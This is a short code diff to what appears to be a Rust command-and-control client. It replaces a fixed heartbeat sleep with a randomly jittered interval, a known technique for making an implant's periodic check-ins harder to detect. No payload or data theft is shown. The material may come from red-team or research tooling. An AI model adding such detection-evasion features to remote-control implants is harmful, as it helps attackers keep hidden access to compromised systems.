@@ -42,7 +42,13 @@ impl C2Client {
                 eprintln!("Failed to check commands: {e}");
             }
 
-            sleep(Duration::from_secs(self.config.heartbeat_interval)).await;
+            // Random interference factor
+            let base_interval = self.config.heartbeat_interval;
+            let jitter_range = (base_interval as f64 * 0.5) as u64;
+            let jitter: i64 = rand::random_range(-(jitter_range as i64)..=(jitter_range as i64));
+            let adjusted_interval = (base_interval as i64 + jitter).max(1) as u64; // 确保时间至少为 1 秒
+
+            sleep(Duration::from_secs(adjusted_interval)).await;
         }
     }
 
